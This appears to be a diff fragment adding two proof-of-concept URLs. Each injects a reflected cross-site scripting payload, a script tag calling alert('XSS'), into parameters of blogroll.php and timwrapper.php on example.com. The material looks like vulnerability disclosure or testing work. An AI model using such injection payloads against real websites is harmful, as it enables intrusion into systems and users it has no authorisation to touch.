@@ -1,0 +1,4 @@
+
+http://www.example.com/includes/blogroll.php?id=1&amp;color=123;}&lt;/style&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;| 
+
+http://www.example.com/includes/timwrapper.php?src=%22%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E 
